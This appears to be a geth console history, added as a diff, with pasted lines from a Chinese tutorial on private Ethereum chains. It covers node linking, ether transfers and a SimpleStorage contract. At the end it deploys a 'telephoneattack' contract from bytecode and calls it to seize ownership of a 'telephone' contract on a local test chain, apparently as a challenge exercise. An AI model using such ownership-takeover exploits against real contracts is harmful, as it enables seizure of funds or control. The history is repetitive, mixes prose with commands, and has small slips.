@@ -1,0 +1,151 @@
+admin.peers
+admin.nodeInfo
+eth.accounts
+eth.getBalance(eth.accounts[0])
+eth.accounts
+txpool.status
+miner.start(12);admin.sleepBlocks(1);miner.stop();
+txpool.status
+eth.getBalance(eth.accounts[0])
+15
+在第一台电脑上启动节点：
+在第二台电脑上初始化（使用相同的 json 文件）并启动节点，注意网络 ID 要
+相同，确保节点都在一个私有网络中(如果是在同一台电脑上面启动两个节点，
+在启动节点时先关闭网络，确保节点使用的是 127.0.0.1，然后启动第二个节点
+时需要通过--port 修改其绑定的端口号，否则会报端口已经绑定的错误)：
+如果新加入的节点 2 报错：
+INFO [11-11|11:33:20.919] Looking for peers
+peercount=1 tried=6 static=0
+WARN [11-11|11:33:25.746] Node data write error
+err="trie node 04a4c4…94915d failed with all peers (1 tries, 1 peers)"
+WARN [11-11|11:33:25.746] Synchronisation failed, retrying err="trie
+node 04a4c4…94915d failed with all peers (1 tries, 1 peers)"
+需要启动节点节点 1 的挖矿程序，然后过一段时间之后，节点二同步数据成
+功。
+bootnodes 后边的参数是第一台电脑上节点的 enode url ，包括 ip 和端口号等
+信息，都可以在第一台电脑上通过如下命令来获取：
+至此两个节点应该就链接成功了。
+节点间发送以太币：
+from 中填当前节点的账号地址，to 中填要发送给的节点的账号地址。
+geth --datadir data1 --networkid 1008 --bootnodes "enode://xxx@192.168.1.2:30303"console
+eth.sendTransaction({from:"0xe6c17764de48c1767e66b6676ea
+742fb3055c33b",to:"0xc05aa2d67995410748c7b9bcd5190289
+91145206",value:web3.toWei(1,"ether")})
+16
+执行以上命令发送一个以太币。注意发送交易操作前要先解锁账号，然后执行
+挖矿才能让交易生效。
+3、 在以太坊私有链上部署第一个智能合约
+智能合约是一段代码和数据的集合，可以部署以太坊网络上运行。如果做比喻
+的话智能合约更像是 JAVA 程序，JAVA 程序通过 JAVA 虚拟机（JVM）将代
+码解释字节进行执行，以太坊的智能合约通过以太坊虚拟机（EVM）解释成字
+节码进行执行，如果你学过汇编，会发现编译后的字节码和汇编很类似。同时
+智能合约有自己的账户，在时间或事件的驱动下能自动执行一些功能，如可以
+在相互之间传递信息，修改区块链的状态比如账户信息等。以太坊的智能合约
+最大的特点是图灵完备，通俗来说可以完全模拟一台计算机所能做的所有事
+情，大家熟知的比特币其实也可以执行一些简单脚本，但是他就不是图灵完
+备，比如循环指令比特币就无法执行。
+本文的智能合约采用以太坊官方的示例合约，功能就是在区块链上存储一个数
+字，并能够读取出来。代码如下：
+txpool.status
+miner.start(12);admin.sleepBlocks(1);miner.stop();
+txpool.status
+var ABI=[{"constant":false,"inputs":[{"name":"x","type":"uint256"}],"name":"set","outputs":[],"payable":false,"stateMutability":"nonpayable","type":"function"},{"constant":true,"inputs":[],"name":"get","outputs":[{"name":"","type":"uint256"}],"payable":false,"stateMutability":"view","type":"function"}]
+var address = "0x2fdbe65c893965bbd6c6ae0d30e81ec1e4ee4d54"
+var simplestorage = eth.contract(ABI).at(address);
+simplestorage.set(11)
+eth.defaultAccount=eth.coinbase
+simplestorage.set(11)
+simplestorage.get()
+txpool.status
+miner.start(12);admin.sleepBlocks(1);miner.stop();
+txpool.status
+simplestorage.get()
+miner.start(12);admin.sleepBlocks(1);miner.stop();
+var ABI=[{"constant":false,"inputs":[{"name":"x","type":"uint256"}],"name":"set","outputs":[],"payable":false,"stateMutability":"nonpayable","type":"function"},{"constant":true,"inputs":[],"name":"get","outputs":[{"name":"","type":"uint256"}],"payable":false,"stateMutability":"view","type":"function"}]
+var address = "0x2fdbe65c893965bbd6c6ae0d30e81ec1e4ee4d54"
+eth.defaultAccount=eth.coinbase
+var simplestorage = eth.contract(ABI).at(address);
+simplestorage.get()
+simplestorage.set(666)
+simplestorage.get()
+simplestorage.set(666)
+simplestorage.get()
+miner.start(12);admin.sleepBlocks(1);miner.stop();
+simplestorage.get()
+simplestorage.set(666)
+txpool.status
+miner.start(12);admin.sleepBlocks(1);miner.stop();
+txpool.status
+simplestorage.get()
+var simplestorage = eth.contract(ABI).at(address);
+simplestorage.address
+simplestorage.get()
+simplestorage.set(666)
+eth.accounts
+simplestorage.set(666)
+miner.start(12);admin.sleepBlocks(1);miner.stop();
+simplestorage.get()
+var ABI=[{"constant":false,"inputs":[{"name":"x","type":"uint256"}],"name":"set","outputs":[],"payable":false,"stateMutability":"nonpayable","type":"function"},{"constant":true,"inputs":[],"name":"get","outputs":[{"name":"","type":"uint256"}],"payable":false,"stateMutability":"view","type":"function"}]
+eth.accounts
+var ABI=[{"constant":false,"inputs":[{"name":"x","type":"uint256"}],"name":"set","outputs":[],"payable":false,"stateMutability":"nonpayable","type":"function"},{"constant":true,"inputs":[],"name":"get","outputs":[{"name":"","type":"uint256"}],"payable":false,"stateMutability":"view","type":"function"}]
+admin.peers
+eth.getBalance("0x89c5a8e39bda76f0e3fdf3c584ea5ca79b79d8cd")
+var ABI=[{"constant":false,"inputs":[{"name":"x","type":"uint256"}],"name":"set","outputs":[],"payable":false,"stateMutability":"nonpayable","type":"function"},{"constant":true,"inputs":[],"name":"get","outputs":[{"name":"","type":"uint256"}],"payable":false,"stateMutability":"view","type":"function"}]
+var address = "0xfe09fc60f7da0ca181575c1695e815c84f3f9b84"
+eth.defaultAccount=eth.coinbase
+var simplestorage = eth.contract(ABI).at(address);
+simplestorage.get()
+simplestorage.set(666)
+miner.start(12);admin.sleepBlocks(1);miner.stop();
+simplestorage.set(666)
+miner.start(12);admin.sleepBlocks(1);miner.stop();
+var telephoneattackContract = web3.eth.contract([{"constant":false,"inputs":[{"name":"_victim","type":"address"},{"name":"_owner","type":"address"}],"name":"attack","outputs":[],"payable":false,"stateMutability":"nonpayable","type":"function"}]);
+var telephoneattack = telephoneattackContract.new({
+     from: web3.eth.accounts[0], 
+data:'6060604052341561000f57600080fd5b336000806101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff1602179055506101a98061005e6000396000f30060606040526004361061004c576000357c0100000000000000000000000000000000000000000000000000000000900463ffffffff168063662e4ee4146100515780638da5cb5b1461008a575b600080fd5b341561005c57600080fd5b610088600480803573ffffffffffffffffffffffffffffffffffffffff169060200190919050506100df565b005b341561009557600080fd5b61009d610158565b604051808273ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200191505060405180910390f35b3373ffffffffffffffffffffffffffffffffffffffff163273ffffffffffffffffffffffffffffffffffffffff1614151561015557806000806101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff1602179055505b50565b6000809054906101000a900473ffffffffffffffffffffffffffffffffffffffff16815600a165627a7a723058203447638e860b8aa19a55648a83466f444ebd9e1e5b89a262fe65f720bd03e5280029',
+     gas: '4700000'
+   }, function (e, contract){
+    console.log(e, contract);
+    if (typeof contract.address !== 'undefined') {
+         console.log('Contract mined! address: ' + contract.address + ' transactionHash: ' + contract.transactionHash);
+    }
+ })
+var telephoneattack = telephoneattackContract.new({
+     from: web3.eth.accounts[0], 
+data:'0x6060604052341561000f57600080fd5b336000806101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff1602179055506101a98061005e6000396000f30060606040526004361061004c576000357c0100000000000000000000000000000000000000000000000000000000900463ffffffff168063662e4ee4146100515780638da5cb5b1461008a575b600080fd5b341561005c57600080fd5b610088600480803573ffffffffffffffffffffffffffffffffffffffff169060200190919050506100df565b005b341561009557600080fd5b61009d610158565b604051808273ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200191505060405180910390f35b3373ffffffffffffffffffffffffffffffffffffffff163273ffffffffffffffffffffffffffffffffffffffff1614151561015557806000806101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff1602179055505b50565b6000809054906101000a900473ffffffffffffffffffffffffffffffffffffffff16815600a165627a7a723058203447638e860b8aa19a55648a83466f444ebd9e1e5b89a262fe65f720bd03e5280029',
+     gas: '4700000'
+   }, function (e, contract){
+    console.log(e, contract);
+    if (typeof contract.address !== 'undefined') {
+         console.log('Contract mined! address: ' + contract.address + ' transactionHash: ' + contract.transactionHash);
+    }
+ })
+miner.start(12);admin.sleepBlocks(1);miner.stop();
+eth.getCode(telephoneattack.address)
+telephoneattack
+telephoneattack.attack
+telephoneattack.attack("0xe56bc41b241a9b2e6a0f73e6c4654ac7d0df7c6d", eth.accounts[0])
+txpool.status
+miner.start(12);admin.sleepBlocks(1);miner.stop();
+telephoneattack.attack("0xe56bc41b241a9b2e6a0f73e6c4654ac7d0df7c6d", eth.accounts[0])
+telephone
+ABI = [{"constant":false,"inputs":[{"name":"_owner","type":"address"}],"name":"changeowner","outputs":[],"payable":false,"stateMutability":"nonpayable","type":"function"},{"constant":true,"inputs":[],"name":"owner","outputs":[{"name":"","type":"address"}],"payable":false,"stateMutability":"view","type":"function"},{"inputs":[],"payable":false,"stateMutability":"nonpayable","type":"constructor"}]
+addr = "0xe56bc41b241a9b2e6a0f73e6c4654ac7d0df7c6d"
+eth.defaultAccount=eth.coinbase
+eth.defaultAccount=eth.coinbase;var telephone
+telephone = eth.contract(ABI).at(address);
+telephone
+telephone.address
+telephone.owner()
+txpool
+miner.start(12);admin.sleepBlocks(1);miner.stop();
+telephone.owner()
+txpool
+telephone.owner()
+telephoneattack.attack("0xe56bc41b241a9b2e6a0f73e6c4654ac7d0df7c6d", eth.accounts[0])
+eth.getBalance(eth.accounts[0])
+miner.start(12);admin.sleepBlocks(1);miner.stop();
+eth.getBalance(eth.accounts[0])
+telephoneattack.attack("0xe56bc41b241a9b2e6a0f73e6c4654ac7d0df7c6d", eth.accounts[0])
+telephone.address
+miner.start(12);admin.sleepBlocks(1);miner.stop();
